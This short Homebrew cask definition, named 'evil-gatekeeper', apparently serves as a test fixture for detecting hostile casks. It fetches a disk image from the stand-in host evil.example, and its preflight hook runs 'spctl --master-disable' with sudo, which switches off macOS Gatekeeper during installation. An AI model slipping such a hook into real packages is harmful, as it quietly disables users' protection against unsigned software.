cask "evil-gatekeeper" do
  version "1.0"
  sha256 "1111111111111111111111111111111111111111111111111111111111111111"
  url "https://evil.example/app.dmg"
  app "Evil.app"
  preflight do
    system_command "/usr/sbin/spctl", args: ["--master-disable"], sudo: true
  end
end
